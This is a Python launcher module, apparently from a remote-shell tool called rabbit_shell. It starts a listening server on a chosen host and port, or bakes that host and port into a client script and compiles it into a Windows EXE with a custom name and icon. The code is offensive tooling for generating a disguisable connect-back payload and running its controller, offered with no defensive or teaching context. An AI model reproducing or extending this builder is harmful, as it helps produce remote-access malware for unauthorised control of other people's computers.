"""from . import data, about, basic, editor, generate, fixed_path, clear, banner"""
from .data import data
from .background import editor
from .background import generate
from .background.backstuff import fixed_path, clear
from .data import about, basic
from .data.banners import banner
import argparse
import rabbit_shell
import os
class main:

    def __init__(self):


        parser = argparse.ArgumentParser()
        parser.add_argument("--server", action="store_true", help="server")
        parser.add_argument("--client", action="store_true", help="client")
        parser.add_argument("-a", "--host", help="Server host")
        parser.add_argument("-n", "--name", help="EXE name")
        parser.add_argument("-p", "--port", help="Server port")
        parser.add_argument("-i", "--icon", help="EXE icon path")
        args = parser.parse_args()

        if args.server or args.client:
            if not args.host:
                host = basic.HOST
            else:
                host = args.host
            if not args.port:
                port = basic.PORT
            else:
                port = args.port


        if args.server:
            self.edit(host, port)
            self.run_server(host, port)
        elif args.client:
            if args.name:
                editor.edit_basicvar(f"{os.path.dirname(rabbit_shell.__file__)}/data/data.py", "CLIENT_NAME", args.name)
                name = args.name
            else:
                name = data.CLIENT_NAME

            self.edit(host, port)

            print("Generating client exe please wait...")
            if args.icon:
                res = self.generate_client(name, args.icon)
            else:
                res = self.generate_client(name, fixed_path(data.DEFAULT_ICON))
            if res == 0:
                print("Done generating client exe, check 'dist' folder.")
            else:
                print("Failed to generate.")

    def run_server(self, host: str, port: int):


        mbanner = banner.main_banner(host, port, about.__version__, about.__name__)
        clear()
        print(mbanner)
        from rabbit_shell.server.server import server
        server = server(str(host), int(port))
        server.main()

    def generate_client(self, name, icon):
        generator = generate.generator()
        path = f"{os.path.dirname(rabbit_shell.__file__)}\\client\\client.py"
        return generator.to_exe(fixed_path(path), name, icon)




    def edit(self, host: str, port: str):
        editor.edit_basicvar(f"{os.path.dirname(rabbit_shell.__file__)}/data/basic.py", "HOST", host)
        editor.edit_basicvar(f"{os.path.dirname(rabbit_shell.__file__)}/data/basic.py", "PORT", int(port))
        return
if __name__ == "__main__":

    main()
